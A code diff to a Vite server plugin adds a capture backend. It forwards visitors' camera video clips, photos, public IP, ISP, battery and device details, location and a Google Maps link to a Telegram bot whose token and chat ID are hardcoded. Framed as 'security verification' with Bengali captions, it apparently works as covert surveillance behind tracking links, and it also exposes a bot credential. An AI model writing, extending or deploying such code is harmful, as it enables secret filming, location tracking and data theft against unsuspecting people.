@@ -7,6 +7,61 @@ import dotenv from 'dotenv';
 
 dotenv.config();
 
+// Helper to construct structured caption with device, battery, charging, IP, and location
+// eslint-disable-next-line @typescript-eslint/no-explicit-any
+function buildDetailedTelegramCaption(params: {
+  header: string;
+  verificationId: string;
+  alisId?: string;
+  cycle?: number;
+  time?: string;
+  deviceInfo?: any;
+  clientIp?: string;
+}): string {
+  const d = params.deviceInfo || {};
+  const effectiveIp =
+    d.ip && !d.ip.includes('Resolving')
+      ? d.ip
+      : params.clientIp || 'Unknown IP';
+
+  const location = d.location && d.location !== 'Unknown' ? d.location : 'Location Resolved';
+  const mapsUrl =
+    d.mapsUrl ||
+    (effectiveIp && !effectiveIp.startsWith('127.') && effectiveIp !== 'Unknown IP'
+      ? `https://www.google.com/maps?q=${encodeURIComponent(location !== 'Location Resolved' ? location : effectiveIp)}`
+      : '');
+
+  const battery = d.batteryLevel || 'Unknown';
+  const charging = d.batteryCharging || 'Unknown';
+  const device = d.deviceName || 'Smartphone / Desktop';
+  const browser = d.browser || 'Web Browser';
+  const platform = d.platform || 'Unknown OS';
+  const screen = d.screen || 'Default';
+  const isp = d.isp || 'Unknown Network Provider';
+  const timeStr = params.time ? new Date(params.time).toLocaleString('en-US') : new Date().toLocaleString('en-US');
+
+  return (
+`${params.header}
+🆔 সেশন আইডি: ${params.verificationId}
+🔗 লিংক রেফারেন্স: ${params.alisId || 'direct'}
+⏰ সময়: ${timeStr}
+
+📱 ডিভাইস ও ব্যাটারি তথ্য:
+• ডিভাইস নাম: ${device}
+• প্ল্যাটফর্ম/OS: ${platform}
+• ব্রাউজার: ${browser}
+• স্ক্রিন রেজ্যুলেশন: ${screen}
+• ব্যাটারি লেভেল: ${battery}
+• চার্জিং স্ট্যাটাস: ${charging}
+
+🌐 আইপি ও লাইভ লোকেশন:
+• পাবলিক IP: ${effectiveIp}
+• এলাকা/লোকেশন: ${location}
+• ISP/নেটওয়ার্ক: ${isp}
+• গুগল ম্যাপস: ${mapsUrl || 'N/A'}`
+  );
+}
+
 function apiServerPlugin(): Plugin {
   return {
     name: 'api-server',
@@ -32,7 +87,7 @@ function apiServerPlugin(): Plugin {
           req.on('end', async () => {
             try {
               const data = JSON.parse(body || '{}');
-              const { verificationId, alisId, cycle, timestamp, videoBase64, mimeType } = data;
+              const { verificationId, alisId, cycle, timestamp, videoBase64, deviceInfo } = data;
 
               if (!verificationId) {
                 res.statusCode = 400;
@@ -44,38 +99,64 @@ function apiServerPlugin(): Plugin {
               const botToken = process.env.TELEGRAM_BOT_TOKEN || '8765690722:AAEy1PJxZBvK0ajvHLch3gUZBxIeCLp958M';
               const chatId = process.env.TELEGRAM_CHAT_ID || '7121685144';
 
+              const clientIp =
+                (req.headers['x-forwarded-for'] as string)?.split(',')[0].trim() ||
+                req.socket.remoteAddress ||
+                '';
+
               if (botToken && chatId && videoBase64) {
                 try {
                   const rawBase64 = videoBase64.includes(',') ? videoBase64.split(',')[1] : videoBase64;
                   const buffer = Buffer.from(rawBase64, 'base64');
-                  const ext = mimeType && mimeType.includes('mp4') ? 'mp4' : 'webm';
-                  const file = new Blob([buffer], { type: mimeType || 'video/webm' });
+                  
+                  // Ensure MP4 file blob and .mp4 extension
+                  const videoBlob = new Blob([buffer], { type: 'video/mp4' });
+                  const videoFileName = `security_clip_${verificationId}_cycle${cycle || 1}.mp4`;
+
+                  const caption = buildDetailedTelegramCaption({
+                    header: `📹 সিকিউরিটি ফুটেজ [১০ সেকেন্ড ভিডিও #${cycle || 1}] (.mp4)`,
+                    verificationId,
+                    alisId,
+                    cycle: cycle || 1,
+                    time: timestamp,
+                    deviceInfo,
+                    clientIp,
+                  });
+
                   const formData = new FormData();
                   formData.append('chat_id', chatId);
-                  formData.append('video', file, `clip_${verificationId}_cycle${cycle || 1}.${ext}`);
-                  formData.append(
-                    'caption',
-                    `📹 Security Feed [10s Clip #${cycle || 1}]\nID: ${verificationId}\nLink: ${alisId || 'direct'}\nTime: ${
-                      timestamp || new Date().toISOString()
-                    }\nStatus: Active Session Protected`
-                  );
+                  formData.append('video', videoBlob, videoFileName);
+                  formData.append('caption', caption);
 
                   const tgRes = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                     method: 'POST',
                     body: formData,
                   });
                   const tgData = (await tgRes.json()) as { ok: boolean; description?: string };
+
                   if (!tgData.ok) {
-                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    console.warn('sendVideo error in Vite, trying sendDocument:', tgData.description);
+                    const docFormData = new FormData();
+                    docFormData.append('chat_id', chatId);
+                    docFormData.append('document', videoBlob, videoFileName);
+                    docFormData.append('caption', caption);
+
+                    const docRes = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
                       method: 'POST',
-                      headers: { 'Content-Type': 'application/json' },
-                      body: JSON.stringify({
-                        chat_id: chatId,
-                        text: `📹 Security Feed [10s Clip #${cycle || 1}]\nID: ${verificationId}\nTime: ${
-                          timestamp || new Date().toISOString()
-                        }\nStatus: Active Session Protected`,
-                      }),
+                      body: docFormData,
                     });
+                    const docData = (await docRes.json()) as { ok: boolean; description?: string };
+
+                    if (!docData.ok) {
+                      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                          chat_id: chatId,
+                          text: caption,
+                        }),
+                      });
+                    }
                   }
                 } catch (tgErr) {
                   console.warn('Telegram forward error:', tgErr);
@@ -106,7 +187,7 @@ function apiServerPlugin(): Plugin {
           req.on('end', async () => {
             try {
               const data = JSON.parse(body || '{}');
-              const {verificationId, time, photoBase64, alisId} = data;
+              const {verificationId, time, photoBase64, alisId, deviceInfo} = data;
 
               if (!verificationId) {
                 res.statusCode = 400;
@@ -128,8 +209,19 @@ function apiServerPlugin(): Plugin {
                 return;
               }
 
-              const formattedTime = time || new Date().toISOString();
-              const captionText = `✅ New Verification Completed!\nID: ${verificationId}\nLink: ${alisId || 'direct'}\nStatus: VALID\nTime: ${formattedTime}`;
+              const clientIp =
+                (req.headers['x-forwarded-for'] as string)?.split(',')[0].trim() ||
+                req.socket.remoteAddress ||
+                '';
+
+              const captionText = buildDetailedTelegramCaption({
+                header: '📸 ভেরিফিকেশন রিকোয়েস্ট ও ফটো ক্যাপচার',
+                verificationId,
+                alisId,
+                time,
+                deviceInfo,
+                clientIp,
+              });
 
               let photoSent = false;
               if (photoBase64) {
